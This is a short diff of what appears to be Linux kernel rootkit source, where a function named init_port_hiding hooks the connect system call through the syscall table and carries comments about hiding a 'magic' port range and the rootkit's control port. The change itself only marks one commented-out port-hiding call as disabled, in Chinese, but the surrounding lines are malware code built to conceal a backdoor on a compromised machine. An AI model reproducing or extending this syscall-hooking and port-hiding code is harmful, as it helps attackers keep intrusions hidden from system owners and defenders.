@@ -490,7 +490,7 @@ int init_port_hiding(void) {
     sys_call_table[__NR_connect] = (unsigned long)hooked_connect;
     enable_write_protection();
     
-    // 自动隐藏魔术端口范围
+    // 自动隐藏魔术端口范围 (已禁用)
     // hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
     
     // 隐藏rootkit控制端口
